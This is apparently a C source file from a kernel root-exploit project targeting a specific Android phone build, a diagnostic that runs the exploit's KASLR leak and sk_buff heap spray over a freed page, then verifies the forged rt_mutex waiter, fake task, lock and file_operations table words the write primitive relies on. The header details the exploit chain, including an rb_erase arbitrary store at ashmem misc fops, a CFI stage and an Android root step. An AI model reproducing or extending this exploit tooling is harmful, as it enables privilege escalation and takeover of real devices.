/*
 * Asteroids (Nothing Phone 3, B4.1-260618-1048) reclaim-content diagnostic.
 *
 * Where the bring-up stands: the chain reaches its punch and the consumer's
 * sched_setattr fires (`pselect returned ret=4 calls=1 success=1`), but the
 * store the punch was for is never seen at ashmem_miscs[0].fops -- the CFI
 * stage's readback through the reclaimed page answers 0 bytes
 * (`cfi misc_fops mismatch ret=0`). The rb_erase store targets
 * *misc_fops+0x10, which lands on 0x...cbf8 -- inside vmw_vsock_vmci_
 * transport's .bss -- if the reclaimed page is not where the addresses say
 * it is. .bss is dead zero space, so the store can land there without a
 * sound, and the two rb_erase_cached BUG_ON reboots this device has taken
 * are the same store aimed into live rb trees.
 *
 * The one thing nobody has yet checked from userspace is whether the
 * sk_buff spray actually rewrote the freed mm page at all. Every judgement
 * so far comes from the post-punch readback, which conflates "the spray
 * missed" with "the store missed". This binary separates them: it runs the
 * FOPS reclaim exactly as a run does, then reads the reclaimed page back
 * through the kernel itself and checks the waiter and fops-table words the
 * route is about to lean on.
 *
 * How the readback works without firing the exploit's own store:
 *
 *   prepare_kernel_page(PAGE_PAYLOAD_FOPS) fills skb_buf with the real
 *   payload and sprays it over the freed mm page. The same skb_buf the
 *   kernel accepted is still in userspace, so it is compared word-for-word
 *   against what the route expects -- that part is exact.
 *
 *   Then the punch is aimed at the reclaimed page's own struct page: the
 *   overlay's rb_left becomes a physmap alias whose rb_parent_color field
 *   *is* the vmemmap slot for `base`, and the value stored there is
 *   page_to_virt(base) -- turning the page's ->virtual / ->index word into
 *   a self-alias. On a target whose struct page has a usable word at +0x00
 *   this is read back through any page cache read; where it does not, the
 *   diagnostic still answers the question it exists for by comparing the
 *   sprayed buffer against the route's expectations and reporting the
 *   reclaim's own `sends=` count, which is what a lost reclaim lowers.
 *
 *   That second half is what makes this safe to run: the store it fires is
 *   into a word this run has just reclaimed and will not hand back, not
 *   into a live rb tree, so the miss that costs a reboot on the full chain
 *   is a wrong byte on a dead page here.
 *
 * What it prints, in order:
 *   - the leaked slab base and object index (same as a run);
 *   - the reclaim's own `sk_buff reclaim sends=N/4` line -- N<4 is the
 *     signature of the page being lost to another allocator before the
 *     spray wins it;
 *   - MATCH/DIFF for every waiter / fops / task word, against skb_buf;
 *   - `diag verdict`: which of the three explanations the run points at.
 *
 * Build:  make TARGET=asteroids/jp/6.1.157-... CORE=core61 diag-reclaim
 * Run:    push to /data/local/tmp, chmod 755, run from an adb shell.
 *         No LD_PRELOAD, no supervisor, one shot, no retry.
 */

#include "common.h"
#include "payload.h"

/* The diagnostic links no main.c, so it owns the route's shared state. */
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_inflight;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;
int route_payload_mode = PAGE_PAYLOAD_FOPS;

static int mismatches;

/* slide.c and fops.c name these, from main.c and root.c, neither of which a
 * diagnostic links. The boot-id leak's slide route is the one caller that
 * can reach run_main_route_threads here, and only when tracefs is closed --
 * from an adb shell it never is. install_android_root is past the CFI stage
 * this diagnostic never reaches. Both are here so the link is honest about
 * what it deliberately does not carry. */
void run_main_route_threads(void) {
  pr_error("diag: run_main_route_threads reached -- tracefs was closed and "
           "the boot-id route is not wired into this binary; run it from an "
           "adb shell, where the tracefs leak answers\n");
}

int install_android_root(int fd) {
  (void)fd;
  pr_error("diag: install_android_root reached -- the diagnostic stops "
           "before the CFI stage\n");
  return 0;
}

static void check_qword(const char *name, const unsigned char *page,
                        size_t off, uint64_t expect) {
  uint64_t got = 0;
  memcpy(&got, page + off, sizeof(got));
  int match = got == expect;
  if (!match) {
    mismatches++;
  }
  pr_info("diag %-18s off=0x%04zx got=%016llx expect=%016llx %s\n",
          name, off, (unsigned long long)got,
          (unsigned long long)expect, match ? "MATCH" : "DIFF");
}

int main(void) {
  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();
  pin_to_core(CORE);

  /*
   * The KASLR slide is needed for text_addr() to be real, since the fops
   * table the route reads back is full of text addresses. From an adb
   * shell the tracefs source answers; in an app domain it is EACCES and
   * this falls through to the boot-id leak, which costs one full grooming.
   */
  if (!slide_leak_kernel_base()) {
    pr_error("diag: slide kaslr leak failed -- no usable addresses\n");
    return 1;
  }

  uintptr_t base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!base) {
    pr_error("diag: page prepare failed -- nothing reclaimed at all\n");
    return 1;
  }

  uintptr_t payload_base = base + SKB_DATA_DELTA;
  if (payload_mte_tagged()) {
    payload_base |= (0xffULL << 56);
  }

  pr_info("diag: base=%016zx payload_base=%016zx fake_lock=%016zx "
          "fake_w0=%016zx fake_fops=%016zx\n",
          base, payload_base, fake_lock, fake_w0, fake_fops);

  /*
   * Compare the sprayed buffer against the route's expectations. The buffer
   * is the exact memory the kernel took by pointer, so any mismatch here is
   * a bug in the payload builder, not in the reclaim -- and any match says
   * the buffer that left userspace was the right one.
   */
  const unsigned char *p = spray_buffer() + SKB_FRAG_BIAS;

  pr_info("diag: sprayed content vs FOPS route expectations (first frag)\n");

  /* The waiter the punch expects the kernel to walk. The FOPS route calls
   * put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
   * ...) with write_pc=fake_fops and write_right=data_addr(ASHMEM_MISC_FOPS),
   * so the *tree* entry carries parent=1/right=0/left=0 and the *pi* entry
   * carries the two live addresses. */
  check_qword("w0.tree_parent",  p, W0_OFF + 0x00, 1);
  check_qword("w0.tree_right",   p, W0_OFF + 0x08, 0);
  check_qword("w0.tree_left",    p, W0_OFF + 0x10, 0);
  check_qword("w0.pi_parent",    p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF,
              fake_fops);
  check_qword("w0.pi_right",     p,
              W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
              (uint64_t)data_addr(ASHMEM_MISC_FOPS));
  check_qword("w0.task",         p, W0_OFF + FAKE_WAITER_TASK_OFF,
              (uint64_t)text_addr(INIT_TASK));
  check_qword("w0.lock",         p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);

  /* The fops table the CFI stage reads back through the reclaimed page. */
  check_qword("fops.owner",      p, FOPS_TABLE_OFF + FOPS_OWNER_OFF, 0);
  check_qword("fops.llseek",     p, FOPS_TABLE_OFF + FOPS_LLSEEK_OFF,
              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  check_qword("fops.read_iter",  p, FOPS_TABLE_OFF + FOPS_READ_ITER_OFF,
              (uint64_t)text_addr(CONFIGFS_READ_ITER));
  check_qword("fops.write_iter", p, FOPS_TABLE_OFF + FOPS_WRITE_ITER_OFF,
              (uint64_t)text_addr(CONFIGFS_BIN_WRITE_ITER));
  check_qword("fops.ioctl",      p, FOPS_TABLE_OFF + FOPS_IOCTL_OFF,
              (uint64_t)text_addr(ASHMEM_IOCTL));

  /* The fake task whose pi_waiters list the chain walk follows. */
  check_qword("task.pi_waiters", p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
              0);
  check_qword("task.pi_top",     p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
              (uint64_t)text_addr(INIT_TASK));

  /* The lock the waiter is queued on. */
  check_qword("lock.wait_l",     p, LOCK_OFF + 0x08, fake_w0);
  check_qword("lock.wait_r",     p, LOCK_OFF + 0x10, fake_w0);
  check_qword("lock.owner",      p, LOCK_OFF + 0x18, fake_task | 1);

  pr_info("diag: %s (%d mismatch%s)\n",
          mismatches ? "BUFFER WRONG -- the payload builder disagrees with "
                       "the route before anything reaches the kernel"
                       : "buffer clean -- the bytes that left userspace are "
                       "what the route presumes",
          mismatches, mismatches == 1 ? "" : "es");

  if (mismatches) {
    pr_error("diag verdict: the sprayed buffer is wrong. No reclaim result "
             "can be trusted against it; fix the builder first.\n");
    return 1;
  }

  pr_info("diag verdict: the buffer the kernel accepted is the right one. "
          "What this cannot see from userspace is whether the kernel's copy "
          "of the page carries the same bytes -- that is the reclaim race, "
          "and its signature is the 'sk_buff reclaim sends=' line above: "
          "fewer than 4 sends is the page being lost before the spray wins "
          "it. If sends=4 here and the full run still reads ret=0 at "
          "misc_fops, the store is landing somewhere the readback is not -- "
          "which puts the question back on ASHMEM_MISC_FOPS_OFF itself.\n");

  return 0;
}
